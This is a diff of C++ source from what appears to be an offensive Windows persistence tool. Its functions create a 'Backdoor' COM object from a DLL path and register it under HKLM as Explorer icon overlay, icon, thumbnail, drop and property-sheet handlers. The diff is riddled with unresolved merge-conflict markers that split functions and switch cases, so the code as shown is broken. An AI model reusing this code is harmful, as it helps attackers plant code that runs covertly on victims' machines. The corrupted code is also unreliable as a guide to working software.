@@ -25,7 +25,11 @@
 
 namespace reg {
 
+<<<<<<< HEAD
 	HKEY AddKey(HKEY hKey, CONST WCHAR* subkey) {
+=======
+	HKEY AddKey(HKEY hKey, CONST WCHAR* SUBKEY) {
+>>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 
 		LSTATUS status = NULL;
 		HKEY hkResult = NULL;
@@ -33,6 +37,7 @@ namespace reg {
 		OLECHAR* guidString = { 0 };
 		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;
 
+<<<<<<< HEAD
 		
 		std::wstring logmsg = L"Adding New Registry Key ";
 		
@@ -76,6 +81,12 @@ namespace reg {
 	}
 
 
+=======
+		status = RegCreateKeyExW(hKey, SUBKEY, NULL, NULL, REG_OPTION_NON_VOLATILE, dwKeyRights, NULL, &hkResult, NULL);
+		return (status == ERROR_SUCCESS) ? hkResult : NULL;
+
+	}
+>>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 	std::wstring ResolveProgId(CONST WCHAR* ext) {
 
 		HKEY  hkResult = NULL;
@@ -117,8 +128,11 @@ namespace reg {
 
 	}
 
+<<<<<<< HEAD
 
 
+=======
+>>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath) {
 
 		LSTATUS status = NULL;
@@ -209,7 +223,10 @@ namespace reg {
 		HRESULT hResult = NULL;
 
 		std::wstring strExt;
+<<<<<<< HEAD
 		std::wstring progId;
+=======
+>>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 
 		switch (type) {
 
@@ -217,18 +234,30 @@ namespace reg {
 			
 			hkResult = AddKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\BackdoorOverlay\\");
 			if (hkResult) {
+<<<<<<< HEAD
 				
 				status = AddDefaultValue(hkResult, Guid);
 				if (status == ERROR_SUCCESS) {
 
 					logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");
 					break;
+=======
+				OLECHAR* guidString;
+				hResult = StringFromCLSID(Guid, &guidString);
+				size_t sz = wcslen(guidString);
+				status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)guidString, (DWORD)sz * 2 + 2);
+				if (status == ERROR_SUCCESS) {
+
+					logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");
+
+>>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 				}
 				else {
 				
 					logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Overlay Handler");
 
 				}
+<<<<<<< HEAD
 				break;
 			}
 			break;
@@ -359,9 +388,36 @@ namespace reg {
 					}
 					break;
 				}
+=======
+>>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 				break;
 			}
+			else {
 
+				logging::log(LVL_FATAL, L"Error Creating Backdoor ICON Overlay Key");
+
+			}
+
+<<<<<<< HEAD
+=======
+		case ICON_HANDLER:
+			if (ext) {
+			
+				strExt = std::wstring(ext);
+				ResolveProgId(strExt.c_str());
+			
+			}
+			else {
+
+				logging::log(LVL_FATAL, L"Error Extension Needed for Technique");
+
+			}
+
+			break;
+
+		case DROP_HANDLER:
+		case PROPERTY_SHEET_HANDLER:
+>>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 		case THUMBNAIL_IMAGE_HANDLER:
 			if (ext) {
 
